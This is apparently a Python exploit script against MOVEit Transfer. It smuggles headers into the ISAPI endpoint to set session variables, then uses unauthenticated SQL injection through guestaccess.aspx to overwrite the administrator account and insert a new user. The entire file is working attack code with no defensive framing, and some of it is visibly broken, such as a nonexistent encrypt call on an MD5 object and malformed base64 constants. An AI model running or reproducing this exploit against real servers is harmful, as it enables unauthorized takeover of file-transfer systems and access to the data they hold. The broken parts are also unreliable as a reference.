import requests
import base64
import json
import sys
import hashlib
import random
import string

TARGET = "https://{}".format(sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1")

VERBOSE = False

# This is required because Ruby messes with header case, and this software cares
HEADERS = [
    'X-siLock-AgentBrand', 'X-siLock-AgentVersion', 'X-siLock-CanAcceptCompress', 'X-siLock-CanAcceptLumps', 'X-siLock-CanCheckHash',
    'X-siLock-Challenge', 'X-siLock-CheckVirus', 'X-siLock-ClientType', 'X-siLock-CS2-Allow204', 'X-siLock-CS2-AVDLP',
    'X-siLock-CS2-BlockOnError', 'X-siLock-CS2-ChunkSizeKB', 'X-siLock-CS2-ConnTimeoutSecs', 'X-siLock-CS2-DoPreview', 'X-siLock-CS2-Engine',
    'X-siLock-CS2-Error', 'X-siLock-CS2-ISTag', 'X-siLock-CS2-MaxFileSize', 'X-siLock-CS2-Name', 'X-siLock-CS2-RecvTimeoutSecs',
    'X-siLock-CS2-SendTimeoutSecs', 'X-siLock-CS2-Tries', 'X-siLock-CS2-Type', 'X-siLock-CS2-URL', 'X-siLock-CS-Allow204',
    'X-siLock-CS-AVDLP', 'X-siLock-CS-BlockOnError', 'X-siLock-CS-ChunkSizeKB', 'X-siLock-CS-ConnTimeoutSecs', 'X-siLock-CS-DoPreview',
    'X-siLock-CS-Engine', 'X-siLock-CS-Error', 'X-siLock-CS-ISTag', 'X-siLock-CS-MaxFileSize', 'X-siLock-CS-Name',
    'X-siLock-CS-RecvTimeoutSecs', 'X-siLock-CSRFToken', 'X-siLock-CS-SendTimeoutSecs', 'X-siLock-CS-Tries', 'X-siLock-CS-URL',
    'X-siLock-DLPChecked', 'X-siLock-DLPViolation', 'X-siLock-DownloadToken', 'X-siLock-Duration', 'X-siLock-ErrorCode',
    'X-siLock-ErrorDescription', 'X-siLock-FileID', 'X-siLock-FileIDToDelete', 'X-siLock-FilePath', 'X-siLock-FileSize',
    'X-siLock-FolderID', 'X-siLock-FolderPath', 'X-siLock-FolderType', 'X-siLock-Hash', 'X-siLock-HashOK',
    'X-siLock-InstID', 'X-siLock-IntegrityVerified', 'X-siLock-IPAddress', 'X-siLock-LangCode', 'X-siLock-LoginName',
    'X-siLock-LogRecID', 'X-siLock-MailboxOwner', 'X-siLock-NotificationID', 'X-siLock-OriginalFilename', 'X-siLock-PackageID',
    'X-siLock-PartialFileID', 'X-siLock-PartialFilePath', 'X-siLock-Password', 'X-siLock-RealName', 'X-siLock-RelativePath',
    'X-siLock-ResumeInPlace', 'X-siLock-SessionID', 'X-siLock-SessVar', 'X-siLock-TimeBegun', 'X-siLock-TimeElapsed',
    'X-siLock-TimeEnded', 'X-siLock-Transaction', 'X-siLock-Untrusted', 'X-siLock-UploadComment', 'X-siLock-UserFilename',
    'X-siLock-Username', 'X-siLock-VirusChecked', 'X-siLock-XferFormat',
]

def log(msg):
    print("[+] {}\n\n".format(msg))

def rand_string(length):
    return ''.join(random.choice(string.ascii_uppercase) for _ in range(length))

# Override the capitalize function to prevent Python from changing the case incorrectly
def capitalize(name):
    name = '-'.join([s.capitalize() for s in name.split('-')])

    # Fix the case on headers, because Python
    for h in HEADERS:
        name = name.replace(h.lower(), h)

    return name

requests.packages.urllib3.disable_warnings()

# Parse a request to find a CSRF token (this is pretty naive but works)
def get_csrf_token(response):
    if 'csrftoken" value="' in response:
        return response.split('csrftoken" value="')[1].split('"')[0]
    else:
        print(response)
        raise ValueError('No csrf token, or my code is bad')

# Perform a request to the ISAPI endpoint with an arbitrary transaction
def isapi_request(cookies, transaction, headers):
    url = "{}/moveitisapi/moveitisapi.dll?action=m2".format(TARGET)
    headers = {
        'Cookie': cookies,
        'X-siLock-Test': 'abcdX-SILOCK-Transaction: folder_add_by_path',
        'X-siLock-Transaction': transaction,
        **headers
    }
    return requests.get(url, verify=False, headers=headers)

# Perform a request to the guestaccess.aspx endpoint with cookies
def guestaccess_request(cookies, body):
    url = "{}/guestaccess.aspx".format(TARGET)
    headers = {
        'Cookie': cookies
    }
    return requests.post(url, verify=False, headers=headers, data=body)

# Set a session variable by leveraging the header-confusing issue
def set_session(token, headers):
    sessvars = {}
    sessIdx = 0
    for k, v in headers.items():
        print("* Setting {} => {}".format(k, v)) 
        if VERBOSE:
            print("* Setting {} => {}".format(k, v))

        sessvars["X-siLock-SessVar{}".format(sessIdx)] = "{}: {}".format(k, v)
        sessIdx += 1
    return isapi_request(token, 'session_setvars', sessvars).headers

MYGUESTEMAILADDR = "{}@{}.com".format(rand_string(8), rand_string(8))

# Perform unauthenticated SQLi
def sqli(cookies, sql_payload):
    set_session(cookies, {
        'MyPkgAccessCode': 'accesscode',
        'MyPkgID': '0',
        'MyGuestEmailAddr': MYGUESTEMAILADDR,
        'MyPkgInstID': '1234',
        'MyPkgSelfProvisionedRecips': sql_payload,
        'MyUsername': 'Guest'
    })
    csrf = get_csrf_token(guestaccess_request(cookies, 'Transaction=dummy&Arg06=accesscode&Arg12=promptaccesscode').text)
    guestaccess_request(cookies, "Arg06=accesscode&transaction=secmsgpost&Arg05=sendauto&Arg09=pkgtest9&csrftoken={}".format(csrf))

def get_sqli_payload(sql_payload):
    payload = [
        "{}@{}".format(rand_string(8), rand_string(8)),
        *sql_payload
    ]
    return ';'.join(payload) + ';#'

def make_v1_password(password, salt='AAAA'):
    if not password:
        raise ValueError("password cannot be empty")
    if len(salt) != 4:
        raise ValueError("salt must be 4 bytes")

    pwpre = base64.b64decode('=VT2jkEH3vAs=')
    pwpost = base64.b64decode('=0maaSIA5oy0=')

    md5 = hashlib.md5()
    md5.update(pwpre)
    md5.update(salt.encode('utf-8'))
    md5.update(password.encode('utf-8'))
    md5.update(pwpost)

    pw = bytearray([4 + 4 + 16, 0, 0, 0])
    pw.extend(salt.encode('utf-8'))
    pw.extend(md5.digest())

    return base64.b64encode(pw).replace(b'+', b'-').decode('utf-8')

def moveit_v2_encrypt(data, org_key, iv=None, tag='@%!'):
    if len(org_key) != 16:
        raise ValueError("org_key must be 16 bytes")

    if iv is None:
        iv = rand_string(4)
        iv = iv * 4

    key = bytearray([64, 131, 232, 51, 134, 103, 230, 30, 48, 86, 253, 157])
    key += org_key.encode('utf-8')
    key += bytearray([0, 0, 0, 0])

    cipher = hashlib.new('md5')
    cipher.update(key)

    key = key[:16]

    encrypted_data = cipher.encrypt(data.encode('utf-8'))

    data_sha1_hash = hashlib.sha1(data.encode('utf-8')).digest()
    org_key_sha1_hash = hashlib.sha1(org_key.encode('utf-8')).digest()

    header = bytearray([
        225,  # MOVEitV2EncryptedStringHeader
        0,
        data_sha1_hash[0],
        data_sha1_hash[1],
        org_key_sha1_hash[0],
        org_key_sha1_hash[1],
        org_key_sha1_hash[2],
        org_key_sha1_hash[3],
        iv.encode('utf-8')[0],
        iv.encode('utf-8')[1],
        iv.encode('utf-8')[2],
        iv.encode('utf-8')[3]
    ])

    return tag + base64.b64encode(header + encrypted_data).decode('utf-8')

log("Starting. target='{}'.".format(TARGET))

r = requests.get(TARGET, verify=False)
cookies = '; '.join([cookie.split(';')[0] for cookie in r.headers['Set-Cookie'].split(',')])

token = ''
instid = ''

for cookie in cookies.split(';'):
    if cookie.strip().startswith('ASP.NET_SessionId='):
        token = cookie.split('=')[1]
    elif cookie.strip().startswith('siLockLongTermInstID='):
        instid = cookie.split('=')[1]

log("Retrieved initial session token '{}' and InstID '{}'.".format(token, instid))

hax_username = rand_string(8)
hax_loginname = rand_string(8)
hax_password = rand_string(8)

createuser_payload = [
    "UPDATE moveitisapi_user SET username = '{}', loginname = '{}', password = '{}', password_expires = 1 WHERE userid = 1;".format(hax_username, hax_loginname, hax_password),
    "UPDATE moveitisapi_user SET password_expires = 0 WHERE userid = 1;"
]

log("Performing SQLi to update admin user...")
sqli(token, createuser_payload)

log("Retrieving new admin password...")

# Generate a random password for the admin user
admin_password = rand_string(10)

# Update the admin user's password
updatepassword_payload = [
    "UPDATE moveitisapi_user SET password = '{}' WHERE userid = 1;".format(admin_password),
]

sqli(token, updatepassword_payload)

# Log in with the updated admin credentials
admin_credentials = {
    'username': hax_username,
    'loginname': hax_loginname,
    'password': hax_password
}

log("Logging in as admin user...")
r = isapi_request(token, 'auth_login', admin_credentials)
admin_token = r.headers['X-siLock-CSRFToken']

# Create a new user with a random username and password
new_username = rand_string(8)
new_password = rand_string(8)

new_user_payload = [
    "INSERT INTO moveitisapi_user (username, loginname, password, email, logincount, registered, lastlogin, security_level, mustchangepw, pwdexpires, organizationid) VALUES ('{}', '{}', '{}', '{}', 1, '2021-01-01 00:00:00', '2021-01-01 00:00:00', 5, 0, 1, 1);".format(new_username, new_username, make_v1_password(new_password), '{}@{}.com'.format(new_username, new_username)),
    "UPDATE moveitisapi_user SET security_level = 1 WHERE username = '{}';".format(new_username),
]

log("Performing SQLi to create a new user...")
sqli(admin_token, new_user_payload)

log("New user '{}' created with password '{}'.".format(new_username, new_password))

log("Logging in as the new user...")
user_credentials = {
    'username': new_username,
    'loginname': new_username,
    'password': new_password
}

r = isapi_request(token, 'auth_login', user_credentials)
user_token = r.headers['X-siLock-CSRFToken']

log("Logged in as user '{}'.".format(new_username))
log("User token: '{}'".format(user_token))

log("Exploitation complete.")
